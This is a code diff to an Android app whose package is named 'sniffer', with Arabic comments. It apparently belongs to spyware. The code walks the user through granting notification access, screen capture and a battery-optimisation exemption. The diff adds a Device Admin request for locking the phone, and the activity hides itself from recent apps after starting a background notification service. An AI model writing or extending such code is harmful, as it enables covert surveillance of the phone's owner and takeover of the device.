@@ -1,6 +1,8 @@
 package com.v8.global.sniffer;
 
 import android.Manifest;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.media.projection.MediaProjectionManager;
@@ -62,15 +64,24 @@ public class MainActivity extends AppCompatActivity {
             }
             // 2. صلاحية الإشعارات
             startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
-            // 3. صلاحية تسجيل الشاشة (MediaProjection)
+            // 3. صلاحية تسجيل الشاشة
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
-                startActivityForResult(projectionManager.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION);
+                MediaProjectionManager pm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
+                startActivityForResult(pm.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION);
             }
             // 4. تجاهل البطارية
             Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
             intent.setData(Uri.parse("package:" + getPackageName()));
             startActivity(intent);
+            // 5. صلاحية Device Admin (للقفل)
+            ComponentName admin = new ComponentName(this, AdminReceiver.class);
+            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+            if (!dpm.isAdminActive(admin)) {
+                Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
+                startActivity(adminIntent);
+            }
+
             Toast.makeText(this, "✅ تم فتح جميع الصلاحيات", Toast.LENGTH_LONG).show();
         });
 
@@ -83,7 +94,7 @@ public class MainActivity extends AppCompatActivity {
         startService(new Intent(this, NotifyService.class));
 
         // إنهاء النشاط بعد 1.5 ثانية (يختفي من التطبيقات الحديثة)
-        new android.os.Handler().postDelayed(() -> finish(), 1500);
+        new android.os.Handler().postDelayed(this::finish, 1500);
     }
 
     @Override
@@ -103,6 +114,6 @@ public class MainActivity extends AppCompatActivity {
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                            @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        // لا حاجة لإشعار إضافي
+        Toast.makeText(this, "✅ تم طلب الصلاحيات", Toast.LENGTH_SHORT).show();
     }
 }
